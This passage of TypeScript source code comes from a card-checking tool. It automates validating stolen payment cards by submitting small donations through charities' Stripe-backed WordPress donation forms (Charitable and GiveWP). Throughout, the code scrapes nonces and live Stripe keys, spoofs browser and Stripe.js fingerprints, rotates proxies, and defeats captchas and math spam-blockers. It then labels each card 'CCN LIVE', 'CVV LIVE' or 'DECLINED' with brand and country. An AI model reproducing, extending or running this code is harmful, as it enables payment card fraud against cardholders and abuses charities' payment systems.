      threeDsUrl: redirectUrl,
      threeDsType,
      threeDsAttempt: "frictionless_failed",
      intentId,
    };
  }

  // unknown ? re-confirm gave no clean answer; card is still live (requires_action
  // already confirmed that), just label it explicitly so it stands out
  return {
    ...base, status: "live",
    response: formatCardResult({ ...common, detail: "3DS Unresolved", intentId }),
    intentId,
  };
}

// --- Gate extras (optional overrides set via dashboard gate config) -----------
export interface GateExtras {
  donateAmount?:       string;   // e.g. "5.00" � overrides hardcoded amounts
  currency?:           string;   // e.g. "USD", "EUR"
  wcNonce?:            string;   // pre-seeded WC checkout nonce (skip scrape)
  wcStoreNonce?:       string;   // pre-seeded WC Store API nonce
  ajaxNonce?:          string;   // GiveWP AJAX nonce
  gfPiNonce?:          string;   // GravityForms PI nonce override
  connectedAccount?:   string;   // Stripe acct_ override
  billingName?:        string;   // override random name
  billingEmail?:       string;   // override random email
  billingPhone?:       string;
  billingAddress?:     string;
  billingCity?:        string;
  billingState?:       string;
  billingZip?:         string;
  billingCountry?:     string;
  timeout?:            number;   // ms per request override
  platform?:           string;   // e.g. "shopify", "woocommerce" � skips irrelevant flows
  checkoutPath?:       string;   // override checkout URL path (e.g. "/order/")
  shopPath?:           string;   // override shop path for product discovery
  productId?:          number;   // force a specific WC product ID for add-to-cart
  wcPaySlug?:          string;   // force a specific Store API payment_method slug
  proxyCountry?:       string;   // pin checks to proxies whose exit IP is in this ISO-2 country
  donationType?:       "single" | "subscription"; // GiveWP donation mode � refs use "subscription" with off_session
  // Pre-extracted donation form fields. The auto-detector populates these at
  // gate-setup time so the runtime scraper doesn't have to find them again
  // (and so URLs that need user-input fallback can still proceed). All are
  // optional � the scraper still tries to derive them per-request.
  giveFormId?:         string;
  giveFormIdPrefix?:   string;
  giveFormHash?:       string;
  charitableFormId?:   string;
  wpFsFormName?:       string;
  wpfsCustomInputCount?: number; // WPFS admin-defined custom input field count (1=default, 0=none)
  ajaxUrl?:            string;   // override admin-ajax endpoint (e.g. site moved/rewrote it)
  // -- Tier B additions --------------------------------------------------------
  captchaProvider?:    "2captcha" | "anticaptcha";
  captchaApiKey?:      string;   // API key for the chosen solver
  walletConfigId?:     string;   // manual override (WHMCS Stripe Auth) when page extraction fails
  rawCookies?:         string;   // raw Cookie header for pre-authenticated sessions
  // -- Classification + proxy overrides ----------------------------------------
  /** Decline codes/keywords forced to "live" classification (overrides default classifier) */
  liveOverrides?:      string[];
  /** Decline codes/keywords forced to "dead" classification */
  deadOverrides?:      string[];
  /** Pin all requests to a specific proxy URL � bypasses the rotating pool for this gate. */
  proxyOverride?:      string;
}

// -----------------------------------------------------------------------------

export async function checkCardStripeCharitable(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  donatePath?: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 2) year = "20" + year;
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name      = extras?.billingName  || rndName();
  const email     = extras?.billingEmail || rndEmail();
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const nameParts = name.split(" ");
  const firstName = nameParts[0];
  const lastName  = nameParts.slice(1).join(" ") || "Smith";

  try {
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };

    let normalizedDonatePath = donatePath;
    if (normalizedDonatePath) {
      if (normalizedDonatePath.startsWith("http")) {
        try { normalizedDonatePath = new URL(normalizedDonatePath).pathname; } catch {}
      }
      if (!normalizedDonatePath.startsWith("/")) normalizedDonatePath = "/" + normalizedDonatePath;
    }

    const pathsToTry = normalizedDonatePath
      ? [normalizedDonatePath, "/donate/", "/give/", "/support/", "/ways-to-support/", "/donation/"]
      : ["/donate/", "/give/", "/support/", "/ways-to-support/", "/donation/", "/contribute/"];

    let donateNonce: string | null = null;
    // Seed the form id from gate settings (auto-detector populates it). Page
    // scrape below may still find a fresher value and overwrite it.
    let formId: string | null = extras?.charitableFormId || null;
    let campaignId: string | null = null;
    let mathAnswer: string | null = null;
    let foundPath = "";

    for (const path of pathsToTry) {
      try {
        const donateUrl = `${cleanSiteUrl}${path}`;
        const resp = await sessionFetch(donateUrl, state);
        state = resp.state;

        if (!resp.ok) continue;

        donateNonce = extractBetween(resp.text, '_charitable_donation_nonce', 'value="')
          ? extractBetween(resp.text.substring(resp.text.indexOf('_charitable_donation_nonce')), 'value="', '"')
          : null;
        if (!donateNonce) {
          const nonceMatch = resp.text.match(/_charitable_donation_nonce["'\s]+value=["']([^"']+)/);
          if (nonceMatch) donateNonce = nonceMatch[1];
        }
        if (!donateNonce) {
          const nonceMatch2 = resp.text.match(/name=["']_charitable_donation_nonce["'][^>]*value=["']([^"']+)/);
          if (nonceMatch2) donateNonce = nonceMatch2[1];
        }

        const charitablePatterns: RegExp[] = [
          /name=["']charitable_form_id["'][^>]*value=["']([^"']+)/,
          /charitable_form_id["'\s]+value=["']([^"']+)/,
          /value=["']([^"']+)["'][^>]*name=["']charitable_form_id["']/,
          /data-form-id=["'](\d+)["'][^>]*charitable/i,
          /charitable[^>]*data-form-id=["'](\d+)["']/i,
          /charitable_form_settings\s*=\s*\{[^}]*\bid\s*:\s*["']?(\d+)/,
          /"form_id"\s*:\s*"?(\d+)"?/,
        ];
        for (const pat of charitablePatterns) {
          const m = resp.text.match(pat);
          if (m && m[1]) { formId = m[1]; break; }
        }

        const campMatch = resp.text.match(/name=["']campaign_id["'][^>]*value=["']([^"']+)/);
        if (campMatch) campaignId = campMatch[1];

        const mathAnswerMatch = resp.text.match(/["']math_answer["']\s*:\s*["'](\d+)["']/);
        if (mathAnswerMatch) mathAnswer = mathAnswerMatch[1];

        if (!publicKey) {
          const keyMatch = resp.text.match(/pk_live_[a-zA-Z0-9_-]{20,}/);
          if (keyMatch) publicKey = keyMatch[0];
        }

        if (donateNonce && formId) {
          foundPath = path;
          dbg(`[charitable] Found nonce + form on ${path}: nonce=${donateNonce.substring(0, 10)}..., form=${formId}${mathAnswer ? `, math=${mathAnswer}` : ''}`);
          break;
        }
      } catch {}
    }

    if (!donateNonce || !formId) {
      // Tell the operator which piece is missing � that decides the fix:
      // "no form_id" usually means the donate URL was wrong (the form lives at
      // a different path on this site); "no nonce" means the page rendered but
      // the form isn't a Charitable donation form. Setting `donatePath` in the
      // gate config is the usual repair.
      const missing = [!formId && "form_id", !donateNonce && "nonce"].filter(Boolean).join(" + ");
      return {
        status: "error",
        response: `Charitable form not found (missing ${missing}) � set "donatePath" in gate to the donate page URL`,
        code: "no_charitable_form",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    if (!publicKey) {
      return {
        status: "error",
        response: "No Stripe key found on charitable site",
        code: "no_stripe_key",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const pmBody = new URLSearchParams({
      type: "card",
      "billing_details[name]": name,
      "billing_details[email]": email,
      "billing_details[address][city]": billing.city,
      "billing_details[address][country]": billing.country,
      "billing_details[address][line1]": (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
      "billing_details[address][postal_code]": billing.zip,
      "billing_details[address][state]": billing.stateCode,
      "card[number]": cardNumber.trim(),
      "card[cvc]": cvv.trim(),
      "card[exp_month]": month,
      "card[exp_year]": year,
      guid: crypto.randomUUID(),
      muid: crypto.randomUUID(),
      sid: crypto.randomUUID(),
      payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`,
      referrer: cleanSiteUrl,
      time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
      key: publicKey,
    });
    if (extras?.billingPhone) pmBody.append("billing_details[phone]", extras.billingPhone);

    const pmResp = await fetch("https://api.stripe.com/v1/payment_methods", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
        Origin: "https://js.stripe.com",
        Referer: "https://js.stripe.com/",
        "User-Agent": ua,
      },
      body: pmBody.toString(),
    });

    const pmResult = await pmResp.json();
    const pmId = pmResult.id;
    const card = pmResult.card || {};
    const brand = (card.brand || detectBrandFromBin(cardNumber.trim())).toUpperCase();
    const funding = card.funding || "unknown";
    const country = card.country || "??";
    const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
    const cardMeta = { brand, funding, country, threeDs, billing };

    if (!pmId) {
      if (pmResult.error) {
        const classified = classifyStripeResponse(pmResult, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        return classified;
      }
      return {
        status: "error",
        response: "Stripe tokenization failed",
        code: "tokenize_failed",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    dbg(`[charitable] Got PM ${pmId}, submitting donation to ${cleanSiteUrl}/wp-admin/admin-ajax.php`);

    const donationBody = new URLSearchParams({
      charitable_form_id: formId,
      [formId]: "",
      _charitable_donation_nonce: donateNonce,
      _wp_http_referer: foundPath,
      campaign_id: campaignId || "0",
      description: "Donation",
      ID: "0",
      recurring_donation: "once",
      donation_amount: "custom",
      custom_donation_amount: clampAmount(extras?.donateAmount, "1.00"),
      first_name: firstName,
      last_name: lastName,
      email: email,
      address: extras?.billingAddress || (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
      city:  extras?.billingCity    || billing.city,
      state: extras?.billingState   || billing.stateCode,
      postcode: extras?.billingZip  || billing.zip,
      country:  extras?.billingCountry || billing.country,
      gateway: "stripe",
      stripe_payment_method: pmId,
      action: "make_donation",
      form_action: "make_donation",
    });

    if (mathAnswer) {
      donationBody.append("charitable_spamblocker_math_field", mathAnswer);
    }

    const ajaxResp = await sessionFetch(`${cleanSiteUrl}/wp-admin/admin-ajax.php`, state, {
      method: "POST",
      body: donationBody.toString(),
      contentType: "application/x-www-form-urlencoded",
      referer: `${cleanSiteUrl}${foundPath}`,
      origin: cleanSiteUrl,
      accept: "application/json, text/javascript, */*; q=0.01",
      xRequestedWith: true,
    });

    const rawText = ajaxResp.text;
    dbg(`[charitable] Ajax response (${rawText.length} chars): ${rawText.substring(0, 200)}`);

    // Shared 404 guard � same misclassification trap WPFS hit on rivernetwork:
    // a WP 404 HTML page falling through to classifyBankText ? generic decline.
    if (looksLike404Response(rawText, ajaxResp.status)) {
      return {
        status: "error",
        response: `Gateway Error: admin-ajax returned 404 / Page Not Found (status=${ajaxResp.status}). Card was NOT submitted. Set ajaxUrl in gate settings if the site moved admin-ajax.`,
        code: "charitable_admin_ajax_404",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
        rawSnippet: rawText.slice(0, 500),
      };
    }

    try {
      const js = JSON.parse(rawText);

      if (js.success === true) {
        if (js.requires_action) {
          return {
            status: "live",
            response: `CCN LIVE ? 3DS Required | ${brand} ${funding} [${flagEmoji(country) ? `${flagEmoji(country)} ${country}` : country}] 3DS | ?? ${billing.zip} ${billing.line1}${billing.stateCode ? ", " + billing.stateCode : ""} ${billing.country}`,
            code: "requires_action",
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }
        return {
          status: "live",
          response: `CVV LIVE ? Donation Approved | ${brand} ${funding} [${flagEmoji(country) ? `${flagEmoji(country)} ${country}` : country}] ${threeDs} | ?? ${billing.zip} ${billing.line1}${billing.stateCode ? ", " + billing.stateCode : ""} ${billing.country}`,
          code: "charitable_approved",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
          // Persist STABLE values from the scrape. formId is the Charitable
          // form_id we discovered. Nonces excluded � see CheckResult.discoveredSettings.
          discoveredSettings: {
            ...(formId && formId !== extras?.charitableFormId ? { charitableFormId: formId } : {}),
          },
        };
      }

      const stripeError = js.stripe_error || js.error || {};
      if (typeof stripeError === "object" && stripeError) {
        const errMsg = stripeError.message || "";
        const errCode = stripeError.decline_code || stripeError.code || "";
        const combined = `${errCode} ${errMsg}`.toLowerCase();

        if (CCN_WRONG_CVV_CODES.includes(errCode)) {
          return {
            status: "live",
            response: `CCN LIVE ? CVV Wrong | ${STRIPE_DECLINE_MAP[errCode] || errMsg} | ${brand} ${funding} [${country}]`,
            code: errCode,
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }

        if (CCN_LIVE_CODES.includes(errCode) || combined.includes("insufficient") || combined.includes("authentication_required")) {
          return {
            status: "live",
            response: `CCN LIVE ? ${STRIPE_DECLINE_MAP[errCode] || errMsg} | ${brand} ${funding} [${country}]`,
            code: errCode || "ccn_live",
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }

        if (DEAD_CODES.includes(errCode)) {
          return {
            status: "dead",
            response: `DECLINED ? ${STRIPE_DECLINE_MAP[errCode] || errMsg} | ${brand} ${funding} [${country}]`,
            code: errCode,
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }

        if (errCode === "card_declined" || combined.includes("card_declined")) {
          return {
            status: "dead",
            response: `DECLINED ? ${STRIPE_DECLINE_MAP[errCode] || errMsg || "Card Declined"} | ${brand} ${funding} [${country}]`,
            code: errCode || "card_declined",
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }
      }
    } catch {}

    const bankResult = classifyBankText(rawText, gateName, cardMeta);
    bankResult.latency = Date.now() - start;
    bankResult.cardInfo = fullCardInfo;
    return bankResult;

  } catch (e: any) {
    return {
      status: "error",
      response: `Charitable Error: ${e.message}`,
      code: "charitable_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
}

export async function checkCardStripeGiveWP(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  formId?: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 2) year = "20" + year;
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name      = extras?.billingName  || rndName();
  const email     = extras?.billingEmail || rndEmail();
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const nameParts = name.split(" ");
  const firstName = nameParts[0];
  const lastName  = nameParts.slice(1).join(" ") || "Smith";

  try {
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };
    let donateRoute = "";
    let validateRoute = "";
    let detectedFormId = formId || "";
    let detectedKey = publicKey;
    let connectedAccount = "";   // Stripe Connect acct_... for platform/marketplace sites
    // -- Amount config scraped from the form --------------------------------
    // GiveWP forms can override the default min ($1) / max ($999999) AND can
    // enforce preset price levels. Real structure (from capa-hc.org live HTML):
    //   <input type="hidden" name="give-price-id" value="3"/>      ? default
    //   <input name="give-amount" value="100.00"/>                  ? default
    //   <button class="give-donation-level-btn" data-price-id="0">�</button>
    //   <button class="give-donation-level-btn" data-price-id="1">�</button>
    //   �
    // The price-id is on a SEPARATE hidden input � not on the give-amount input
    // � and the preset levels are <button> elements with data-price-id, NOT
    // <input> elements. Sending the operator's amount with the wrong price-id
    // (or with price-id="0" when the form forbids custom amounts) triggers:
    //   "Donation amount $X is invalid."
    let formMinAmount = 0;
    let formMaxAmount = 0;
    // The default values the form rendered with (guaranteed valid pair).
    let pageDefaultAmount = "";
    let pageDefaultPriceId = "";
    // Preset price-id buttons (extracted from <button data-price-id="X">).
    let presetLevels: Array<{ amount: string; priceId: string }> = [];
    let customAmountEnabled = true;  // assume true; flip if we find explicit "false"

    const extraDonatePaths: string[] = [];
    try {
      const homeResp = await sessionFetch(`${cleanSiteUrl}/`, state, { timeout: 10000 });
      state = homeResp.state;
      if (homeResp.ok) {
        const donateLinks = homeResp.text.matchAll(/href=["']([^"']*(?:donat|give|contribut|support)[^"']*)/gi);
        for (const m of donateLinks) {
          try {
            const u = new URL(m[1], cleanSiteUrl);
            if (u.hostname === new URL(cleanSiteUrl).hostname) {
              const p = u.pathname;
              if (!extraDonatePaths.includes(p)) extraDonatePaths.push(p);
            }
          } catch {}
        }

        if (!detectedKey) {
          const giveVarsMatch = homeResp.text.match(/give_stripe_vars\s*=\s*\{[^}]*"publishable_key"\s*:\s*"(pk_live_[^"]+)"/);
          if (giveVarsMatch) detectedKey = giveVarsMatch[1];
        }
        if (!connectedAccount) {
          const acctMatch = homeResp.text.match(/"stripe_account"\s*:\s*"(acct_[A-Za-z0-9_-]+)"/);
          connectedAccount = acctMatch?.[1] || homeResp.text.match(/\bacct_[A-Za-z0-9_-]{8,}\b/)?.[0] || "";
        }
      }
    } catch {}

    let checkoutNonce = "";
    let ajaxNonce = extras?.ajaxNonce || "";  // pre-seed from gate settings if provided
    let ajaxUrl = `${cleanSiteUrl}/wp-admin/admin-ajax.php`;
    let isClassicGiveWP = false;
    let donatePath = "/donate/";
    let formNonce = "";
    // Reference scripts (shcar.py, ??? ??????6.py) show the actual session nonce
    // GiveWP validates is `give-form-hash` (not give-form-nonce). Without it the
    // site rejects with "We're unable to recognize your session." Some sites
    // also require `give-form-user-register-hash` for guest checkout.
    // Seed from gate settings (auto-detector populates these). The page-scrape
    // loop below still runs and overwrites with fresher values when found, but
    // pre-seeding means the first check works even if the donate page changed
    // its markup since detection.
    let giveFormHash = extras?.giveFormHash || "";
    let giveFormHashUserRegister = "";
    let giveFormIdPrefix = extras?.giveFormIdPrefix || "";
    let giveFormTitle = "Donation";
    // GiveWP's company field is optional per-form. When the site has it
    // DISABLED in donation settings, sending give_company_option/give_company_name
    // triggers strict validation: "The company field is not enabled." ? the
    // whole submission is rejected. We detect presence from the form HTML and
    // only send the fields when the form actually has them.
    // Refs: capa-hc.org error log "Error: The company field is not enabled."
    let formHasCompanyField = false;

    const pagePaths = [...new Set([...extraDonatePaths, "/donate/donation-form/", "/donate/", "/give/", "/support/", "/donations/", "/"])];
    for (const path of pagePaths) {
      try {
        const resp = await sessionFetch(`${cleanSiteUrl}${path}`, state);
        state = resp.state;
        if (resp.text.startsWith("CAPTCHA_BLOCKED")) {
          return { status: "error", response: resp.text, code: "captcha_blocked", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
        }
        if (!resp.ok) continue;

        if (!detectedKey) {
          const giveVarsMatch = resp.text.match(/give_stripe_vars\s*=\s*\{[^}]*"publishable_key"\s*:\s*"(pk_live_[^"]+)"/);
          if (giveVarsMatch) detectedKey = giveVarsMatch[1];
          if (!detectedKey) {
            const keyMatch = resp.text.match(/pk_live_[a-zA-Z0-9_-]{20,}/);
            if (keyMatch) detectedKey = keyMatch[0];
          }
        }
        if (!connectedAccount) {
          const acctMatch = resp.text.match(/"stripe_account"\s*:\s*"(acct_[A-Za-z0-9_-]+)"/);
          connectedAccount = acctMatch?.[1] || resp.text.match(/\bacct_[A-Za-z0-9_-]{8,}\b/)?.[0] || "";
          if (connectedAccount) dbg(`[givewp] Found connected account: ${connectedAccount}`);
        }

        if (!detectedFormId) {
          // Walk the most specific selectors first ? fall through to the
          // generic ones. v3 block-form pages expose data-give-form-id /
          // data-form-id on the React wrapper; v2 uses input[name=give-form-id];
          // some JSON configs ship the id as "formId":N.
          const formIdPatterns: RegExp[] = [
            /data-give-form-id=["'](\d+)["']/,
            /data-form-id=["'](\d+)["']/,
            /name=["']give-form-id["'][^>]*value=["'](\d+)["']/,
            /value=["'](\d+)["'][^>]*name=["']give-form-id["']/,
            /"formId"\s*:\s*(\d+)/,
            /"form_id"\s*:\s*(\d+)/,
            /give-form-(\d+)-/,           // give-form-{id}-prefix CSS / class
            /data-id=["'](\d+)["']/,
            /form-id[=](\d+)/,
          ];
          for (const pat of formIdPatterns) {
            const m = resp.text.match(pat);
            if (m && m[1]) { detectedFormId = m[1]; break; }
          }
        }

        if (!formNonce) {
          // HTML attribute order varies � try name-before-value AND value-before-name
          const nonceMatch = resp.text.match(/name="give-form-nonce"[^>]*value="([^"]+)"/)
            || resp.text.match(/value="([^"]+)"[^>]*name="give-form-nonce"/);
          if (nonceMatch) formNonce = nonceMatch[1];
        }
        // give-form-hash is the *real* session nonce on most GiveWP sites (per ref scripts)
        if (!giveFormHash) {
          const hashMatch = resp.text.match(/name="give-form-hash"[^>]*value="([^"]+)"/)
            || resp.text.match(/value="([^"]+)"[^>]*name="give-form-hash"/);
          if (hashMatch) giveFormHash = hashMatch[1];
        }
        if (!giveFormHashUserRegister) {
          const urh = resp.text.match(/name="give-form-user-register-hash"[^>]*value="([^"]+)"/)
            || resp.text.match(/value="([^"]+)"[^>]*name="give-form-user-register-hash"/);
          if (urh) giveFormHashUserRegister = urh[1];
        }
        // -- Scrape the form's actual amount config -----------------------
        // Min / max (default 0 = "not scraped", we fall back to 1 / 999999).
        if (!formMinAmount) {
          const minM = resp.text.match(/name=["']give-form-minimum["'][^>]*value=["']([\d.]+)["']/)
                    || resp.text.match(/data-give-min=["']([\d.]+)["']/);
          if (minM) formMinAmount = parseFloat(minM[1]) || 0;
        }
        if (!formMaxAmount) {
          const maxM = resp.text.match(/name=["']give-form-maximum["'][^>]*value=["']([\d.]+)["']/)
                    || resp.text.match(/data-give-max=["']([\d.]+)["']/);
          if (maxM) formMaxAmount = parseFloat(maxM[1]) || 0;
        }
        // The page's default amount + price-id pair. The form rendered this
        // together so it's guaranteed valid � sending the SAME pair will pass
        // the validator even when custom amounts are forbidden.
        if (!pageDefaultAmount) {
          const dM = resp.text.match(/name=["']give-amount["'][^>]*value=["']([\d.]+)["']/);
          if (dM) pageDefaultAmount = dM[1];
        }
        if (!pageDefaultPriceId) {
          const pM = resp.text.match(/<input[^>]+type=["']hidden["'][^>]*name=["']give-price-id["'][^>]*value=["']([\w-]+)["']/)
                  || resp.text.match(/<input[^>]+name=["']give-price-id["'][^>]*value=["']([\w-]+)["']/);
          if (pM) pageDefaultPriceId = pM[1];
        }
        // Preset price levels are <button class="give-donation-level-btn"
        // data-price-id="X" data-price="Y">$Y</button>. Capture each level's
        // amount + price-id pair so we can switch when the operator's amount
        // doesn't match the page default.
        if (presetLevels.length === 0) {
          const btnRe = /<button[^>]+give-donation-level-btn[^>]*>/g;
          for (const m of resp.text.match(btnRe) || []) {
            const pM = m.match(/data-price-id=["']([\w-]+)["']/);
            const aM = m.match(/data-price=["']([\d.]+)["']/);
            if (pM) presetLevels.push({ amount: aM ? aM[1] : "", priceId: pM[1] });
          }
        }
        // Custom amount disabled? Look for the explicit form setting marker.
        if (/data-custom-amount=["']false["']|data-give-allow-custom=["']false["']|"custom_amount"\s*:\s*false/.test(resp.text)) {
          customAmountEnabled = false;
        }
        if (!formHasCompanyField) {
          // GiveWP renders the company input only when the admin has enabled
          // the field. Look for any of these unambiguous markers:
          //   <input ... name="give_company_name" ...>
          //   <select ... name="give_company_option" ...>
          //   class="give-company-fieldset" / data-field="give-company-name"
          formHasCompanyField = /name=["']give_company_(name|option)["']|give-company-fieldset|data-field=["']give-company/i.test(resp.text);
        }
        if (!giveFormIdPrefix) {
          const prefix = resp.text.match(/name="give-form-id-prefix"[^>]*value="([^"]+)"/)
            || resp.text.match(/value="([^"]+)"[^>]*name="give-form-id-prefix"/);
          if (prefix) giveFormIdPrefix = prefix[1];
        }
        // Form title shows up as the data-give-form-title attr or the document title
        const titleMatch = resp.text.match(/name="give-form-title"[^>]*value="([^"]+)"/)
          || resp.text.match(/value="([^"]+)"[^>]*name="give-form-title"/);
        if (titleMatch) giveFormTitle = titleMatch[1];

        if (!checkoutNonce && resp.text.includes("give_global_vars")) {
          isClassicGiveWP = true;
          donatePath = path;
          const globalVarsMatch = resp.text.match(/give_global_vars\s*=\s*(\{[\s\S]*?\});/);
          if (globalVarsMatch) {
            try {
              const gv = JSON.parse(globalVarsMatch[1]);
              if (gv.checkout_nonce) checkoutNonce = gv.checkout_nonce;
              if (gv.ajax_vars?.ajaxNonce) ajaxNonce = gv.ajax_vars.ajaxNonce;
              if (gv.ajaxurl) ajaxUrl = gv.ajaxurl;
            } catch {}
          }
          if (!checkoutNonce) {
            const cnMatch = resp.text.match(/checkout_nonce["']\s*:\s*["']([a-f0-9]+)/);
            if (cnMatch) checkoutNonce = cnMatch[1];
          }
          if (!ajaxNonce) {
            const anMatch = resp.text.match(/ajaxNonce["']\s*:\s*["']([a-f0-9]+)/);
            if (anMatch) ajaxNonce = anMatch[1];
          }
          if (!ajaxUrl) {
            const auMatch = resp.text.match(/ajaxurl["']\s*:\s*["']([^"']+)/);
            if (auMatch) ajaxUrl = auMatch[1].replace(/\\\//g, "/");
          }
          dbg(`[givewp] Classic GiveWP detected: checkout_nonce=${checkoutNonce}, ajaxNonce=${ajaxNonce}`);
        }

        if (!donateRoute && detectedFormId) {
          const formViewUrl = `${cleanSiteUrl}/?givewp-route=donation-form-view&form-id=${detectedFormId}`;
          try {
            const formResp = await sessionFetch(formViewUrl, state, { timeout: 8000, maxRetries: 0 });
            state = formResp.state;
            if (formResp.ok && !formResp.text.includes("<title>WordPress") && !formResp.text.includes("critical error")) {
              const donateMatch = formResp.text.match(/givewp-route=donate[^"']*givewp-route-signature=([^"'&]+)[^"']*givewp-route-signature-id=([^"'&]+)[^"']*givewp-route-signature-expiration=(\d+)/);
              if (donateMatch) {
                donateRoute = `${cleanSiteUrl}/?givewp-route=donate&givewp-route-signature=${donateMatch[1]}&givewp-route-signature-id=${donateMatch[2]}&givewp-route-signature-expiration=${donateMatch[3]}`;
                dbg(`[givewp] Got v3 signed donate route`);
              }

              if (!formNonce) {
                const fnMatch = formResp.text.match(/name="give-form-nonce"[^>]*value="([^"]+)"/)
                  || formResp.text.match(/value="([^"]+)"[^>]*name="give-form-nonce"/);
                if (fnMatch) formNonce = fnMatch[1];
              }

              if (!detectedKey) {
                const giveVarsMatch2 = formResp.text.match(/give_stripe_vars\s*=\s*\{[^}]*"publishable_key"\s*:\s*"(pk_live_[^"]+)"/);
                if (giveVarsMatch2) detectedKey = giveVarsMatch2[1];
              }
            }
          } catch {}
        }

        if (donateRoute && detectedKey && (formNonce || checkoutNonce)) break;
      } catch {}
    }

    if (!detectedKey) {
      return { status: "error", response: "No Stripe key found on GiveWP site", code: "no_stripe_key", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
    }

    const address1 = (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`;

    const tokBody = new URLSearchParams({
      "card[number]": cardNumber.trim(),
      "card[cvc]": cvv.trim(),
      "card[exp_month]": month,
      "card[exp_year]": year.length === 4 ? year.slice(-2) : year,
      "card[address_zip]": billing.zip,
      guid: crypto.randomUUID(),
      muid: crypto.randomUUID(),
      sid: crypto.randomUUID(),
      payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`,
      time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
      key: detectedKey,
    });

    const tokResp = await fetch(stripeConnectUrl("https://api.stripe.com/v1/tokens", connectedAccount), {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
        Origin: "https://js.stripe.com",
        Referer: "https://js.stripe.com/",
        "User-Agent": ua,
      },
      body: tokBody.toString(),
    });
    const tokResult = await tokResp.json();
    const tokenId = tokResult.id;
    const card = tokResult.card || {};
    const brand = (card.brand || detectBrandFromBin(cardNumber.trim())).toUpperCase();
    const funding = card.funding || "unknown";
    const country = card.country || "??";
    const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
    const cardMeta = { brand, funding, country, threeDs, billing };

    if (!tokenId) {
      if (tokResult.error) {
        const classified = classifyStripeResponse(tokResult, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        return classified;
      }
      return { status: "error", response: "Stripe tokenization failed", code: "tokenize_failed", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
    }

    dbg(`[givewp] Got token ${tokenId}`);

    if (isClassicGiveWP && (formNonce || checkoutNonce || giveFormHash)) {
      dbg(`[givewp] Using classic admin-ajax submission (formNonce=${!!formNonce}, formHash=${!!giveFormHash}, userRegHash=${!!giveFormHashUserRegister})`);

      // If we still don't have the session-bound hashes, re-fetch the donate page
      // with current session cookies. give-form-hash is required by every modern
      // GiveWP version; without it the site rejects with "session not recognized".
      if (!giveFormHash || !formNonce) {
        try {
          const refetchResp = await sessionFetch(`${cleanSiteUrl}${donatePath}`, state, {
            timeout: 8000,
            maxRetries: 0,
          });
          state = refetchResp.state;
          const html = refetchResp.text;
          if (!formNonce) {
            const fnRefetch = html.match(/name="give-form-nonce"[^>]*value="([^"]+)"/)
              || html.match(/value="([^"]+)"[^>]*name="give-form-nonce"/);
            if (fnRefetch) { formNonce = fnRefetch[1]; dbg(`[givewp] Got form nonce from page re-fetch: ${formNonce}`); }
          }
          if (!giveFormHash) {
            const hashRefetch = html.match(/name="give-form-hash"[^>]*value="([^"]+)"/)
              || html.match(/value="([^"]+)"[^>]*name="give-form-hash"/);
            if (hashRefetch) { giveFormHash = hashRefetch[1]; dbg(`[givewp] Got form-hash from page re-fetch: ${giveFormHash}`); }
          }
